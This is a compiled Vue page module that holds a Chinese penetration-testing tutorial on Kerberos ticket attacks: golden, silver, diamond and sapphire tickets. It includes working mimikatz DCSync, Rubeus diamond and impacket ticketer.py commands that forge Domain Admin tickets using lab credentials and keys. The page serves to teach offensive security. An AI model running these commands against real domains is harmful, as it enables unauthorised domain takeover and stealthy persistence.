import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as e,a,o as t}from"./app-DS0ZCcmM.js";const n={};function l(h,i){return t(),e("div",null,i[0]||(i[0]=[a(`<h1 id="pass-the-ticket" tabindex="-1"><a class="header-anchor" href="#pass-the-ticket"><span>Pass-the-ticket</span></a></h1><p>票据传递攻击，和PTH有些类似，不过这里传递的不是hash，而是票据</p><h2 id="黄金票据-白银票据" tabindex="-1"><a class="header-anchor" href="#黄金票据-白银票据"><span>黄金票据&amp;白银票据</span></a></h2><p>这两个票据及其攻击手法分别在先前的两个阶段攻击中介绍过了，这里就不再做过多的解释，主要是探讨一下这两个票据有什么区别，能拿来进行什么样的操作</p><h3 id="金票与银票的区别" tabindex="-1"><a class="header-anchor" href="#金票与银票的区别"><span>金票与银票的区别</span></a></h3><p><strong>使用的hash不同</strong></p><p>金票和银票的制作虽然相差无几，但是用到的hash是不一样的，金票使用的是krbtgt的ntlm hash而银票使用的是目标服务的hash</p><p><strong>访问权限的不同</strong></p><p>由于金票的拿到的hash权限较高，制作的票据自然能够访问所有的服务，相当于是拥有域控权限了</p><p>由于制作银票用到的hash是目标服务的hash,因此只能访问目标服务，但是通过ldap服务我们能够获取到krbtgt的hash从而制作金票</p><p><strong>认证流程不同</strong></p><ul><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><p><strong>二者能拿来做什么</strong></p><p>本来我是想用银票来横向的(cifs+host),后面被师傅反驳了，说我白费功夫，能拿到机器的hash，说明已经拿下这台机器了(在自己搭环境进行测试时没有注意到这点)，按照师傅的说法银票和金票一般都拿来做维权，例如银票拿个cifs，之后psexec就行了，金票就不用多说了，都能登录</p><h2 id="钻石票据-diamond-ticket" tabindex="-1"><a class="header-anchor" href="#钻石票据-diamond-ticket"><span>钻石票据(Diamond Ticket)</span></a></h2><p>钻石票据会通过域内用户请求合法的TGT后再使用krbtgt的AES256密钥对PAC进行解密、修改、重新加密，生成与合法 PAC 高度相似的 PAC，并且还可以生成合法请求。</p><p>制作钻石票据的前提条件</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">1、krbtgt账户的AES256密钥</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2、域用户</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">密码</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>采用mimikatz来dump krbtgt用户的AES256密钥</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">privilege::debug</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lsadump::dcsync</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /domain:hack.com</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /user:krbtgt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/diamond1.png" alt="diamond1" tabindex="0" loading="lazy"><figcaption>diamond1</figcaption></figure><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>#key</span></span>
<span class="line"><span>aes256_hmac       (4096) : a839afa3136eda434f8a76e182f7cb0ef2713fdef1035ad7c7c083bff4863d35</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>使用Rubeus制作钻石票据</p><p>首先由域内普通用户请求正常的TGT，然后解密TGT，修改PAC权限，重新计算签名，并重新加密生成新ticket</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /groups:GROUPS_ID(eg:512,518,519,520...)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Rubeus.exe diamond /domain:hack.com /user:Administrator /password:UU2FU3O@ADMIN /dc:DC.hack.com /enctype:AES256 /krbkey:a839afa3136eda434f8a76e182f7cb0ef2713fdef1035ad7c7c083bff4863d35 /ticketuser:hacker/groups:512</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/rubeus.png" alt="rubeus" tabindex="0" loading="lazy"><figcaption>rubeus</figcaption></figure><p>这样会生成base64的ticket,我们可以直接导入，或者是把ticket导出来使用，只需要加一个outfile参数，例如<code>/outfile:ticket.kirbi</code></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/DC.hack.com /ptt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>在低权限主机上导入票据，即可访问DC的文件服务</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/nop.png" alt="nop" tabindex="0" loading="lazy"><figcaption>nop</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/wino.png" alt="wino" tabindex="0" loading="lazy"><figcaption>wino</figcaption></figure><p>或者采用别的方法申请钻石票据</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Get user RID</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">powershell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Get-DomainUser</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Identity</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">usernam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">e&gt; </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">-Properties</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> objectsid</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Rubeus.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> diamond</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /tgtdeleg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /ticketuser:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">usernam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">e&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/ticketuserid:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">RID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> usernam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">e&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/groups:512</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># /ticketuser is the username of the principal to impersonate.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># /ticketuserid is the domain RID of that principal.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># /groups are the desired group RIDs (512 being Domain Admins).</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># /krbkey is the krbtgt AES256 hash.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>相较于黄金票据</strong></p><p>钻石票据更加隐蔽，因为它有真实的AS_REQ的阶段，有合法的TGT.</p><p>TGT 由 DC 发布，这意味着它将拥有域的 Kerberos 策略中的所有正确详细信息。尽管这些可以在金票中准确伪造，但它更复杂且容易出错。</p><h2 id="蓝宝石票据-sapphire-ticket" tabindex="-1"><a class="header-anchor" href="#蓝宝石票据-sapphire-ticket"><span>蓝宝石票据(Sapphire Ticket)</span></a></h2><p>钻石票据通过解密来修改PAC中的特权组信息，使用户拥有对域控的访问权限，这样虽然能够绕过常规对TGS是否有AS_REQ的检测，但是伪造的用户实际上并不在这个特权组中，通过对特权组的检测，仍然能够检查到是否进行了钻石票据的攻击。</p><p>蓝宝石票据，相较于钻石票据的区别在于对PAC的修改方式，避免了被检测的问题，利用kerberos的扩展S4U2self + u2u来取得高权限用户的PAC，替换原始的PAC，因为特权群组里确实有这个高权限用户，所以就认定该PAC是合法的，从而绕过检测。</p><h3 id="u2u" tabindex="-1"><a class="header-anchor" href="#u2u"><span>U2U</span></a></h3><p>Kerberos RFC 中将用户到用户身份验证描述为一种方法，该方法“允许客户端请求使用从 TGT 颁发给将验证身份验证的一方的会话密钥对 KDC 颁发的票证进行加密。</p><p>KRB_TGS_REQ将具有以下功能：</p><p>附加票证：将包含从中获取密钥的 TGT。</p><p>ENC-TKT-IN-SKEY：选项指示终端服务器的票证将在提供的附加 TGT 的会话密钥中加密。</p><p>服务名称 （sname） 可以引用用户，而不一定是具有 SPN 的服务。</p><p>U2U验证过程中的两个用户一个充当服务器，另一个充当客户端，允许用户去引用用户</p><h3 id="u2u-s4u2self" tabindex="-1"><a class="header-anchor" href="#u2u-s4u2self"><span>U2U+S4U2SELF</span></a></h3><p>利用域用户发起TGT请求，收到TGT请求后以administrator身份通过S4U2self发起自身的ST请求，这时会请求失败，因为用户账户默认情况下是没有SPN的，但是使用U2U的情况，我们能够委托administrator用户去请求目标用户(域用户)的权限。</p><p>用户A没有SPN，但是在U2U扩展下，允许使用S4U2SELF，A充当服务器，KDC将返回目标用户B(充当客户端的用户)票据，而票据内含有PAC</p><h3 id="利用" tabindex="-1"><a class="header-anchor" href="#利用"><span>利用</span></a></h3><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">python3.8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ticketer.py</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -request</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -impersonate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;administrator&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -domain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;hack.com&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;uu2fu3o&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;!qaz@WSX&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -aesKey</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;a839afa3136eda434f8a76e182f7cb0ef2713fdef1035ad7c7c083bff4863d35&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -domain-sid</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;S-1-5-21-754643614-3937478331-2139222398&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;asd&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -dc-ip</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 192.168.30.10</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -nthash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;8d0e4e5d28d91ac99f7b77368455d9b7&#39;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># impersonate参数指定要伪造的目标域管用户</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#domain参数指定域名</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#user参数指定任意域用户</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#password参数指定任意域用户的密码</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#&#39;asd&#39; 任意用户名，可不存在</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/蓝宝石.png" alt="蓝宝石" tabindex="0" loading="lazy"><figcaption>蓝宝石</figcaption></figure><p>在低权限主机上导入票据</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>kerberos::ptc asd.ccache</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/win2.png" alt="win2" tabindex="0" loading="lazy"><figcaption>win2</figcaption></figure>`,56)]))}const d=s(n,[["render",l],["__file","Pass-the-ticket.html.vue"]]),k=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kerberos%E4%B8%93%E9%A2%98/Pass-the-ticket.html","title":"Pass-the-ticket","lang":"zh-CN","frontmatter":{"description":"Pass-the-ticket 票据传递攻击，和PTH有些类似，不过这里传递的不是hash，而是票据 黄金票据&白银票据 这两个票据及其攻击手法分别在先前的两个阶段攻击中介绍过了，这里就不再做过多的解释，主要是探讨一下这两个票据有什么区别，能拿来进行什么样的操作 金票与银票的区别 使用的hash不同 金票和银票的制作虽然相差无几，但是用到的hash是不...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kerberos%E4%B8%93%E9%A2%98/Pass-the-ticket.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Pass-the-ticket"}],["meta",{"property":"og:description","content":"Pass-the-ticket 票据传递攻击，和PTH有些类似，不过这里传递的不是hash，而是票据 黄金票据&白银票据 这两个票据及其攻击手法分别在先前的两个阶段攻击中介绍过了，这里就不再做过多的解释，主要是探讨一下这两个票据有什么区别，能拿来进行什么样的操作 金票与银票的区别 使用的hash不同 金票和银票的制作虽然相差无几，但是用到的hash是不..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/diamond1.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Pass-the-ticket\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/diamond1.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/rubeus.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/nop.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/wino.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/%E8%93%9D%E5%AE%9D%E7%9F%B3.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/win2.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"黄金票据&白银票据","slug":"黄金票据-白银票据","link":"#黄金票据-白银票据","children":[{"level":3,"title":"金票与银票的区别","slug":"金票与银票的区别","link":"#金票与银票的区别","children":[]}]},{"level":2,"title":"钻石票据(Diamond Ticket)","slug":"钻石票据-diamond-ticket","link":"#钻石票据-diamond-ticket","children":[]},{"level":2,"title":"蓝宝石票据(Sapphire Ticket)","slug":"蓝宝石票据-sapphire-ticket","link":"#蓝宝石票据-sapphire-ticket","children":[{"level":3,"title":"U2U","slug":"u2u","link":"#u2u","children":[]},{"level":3,"title":"U2U+S4U2SELF","slug":"u2u-s4u2self","link":"#u2u-s4u2self","children":[]},{"level":3,"title":"利用","slug":"利用","link":"#利用","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":5.06,"words":1517},"filePathRelative":"渗透测试/Kerberos专题/Pass-the-ticket.md","localizedDate":"2025年1月16日","excerpt":"\\n<p>票据传递攻击，和PTH有些类似，不过这里传递的不是hash，而是票据</p>\\n<h2>黄金票据&amp;白银票据</h2>\\n<p>这两个票据及其攻击手法分别在先前的两个阶段攻击中介绍过了，这里就不再做过多的解释，主要是探讨一下这两个票据有什么区别，能拿来进行什么样的操作</p>\\n<h3>金票与银票的区别</h3>\\n<p><strong>使用的hash不同</strong></p>\\n<p>金票和银票的制作虽然相差无几，但是用到的hash是不一样的，金票使用的是krbtgt的ntlm hash而银票使用的是目标服务的hash</p>\\n<p><strong>访问权限的不同</strong></p>","autoDesc":true}');export{d as comp,k as data};
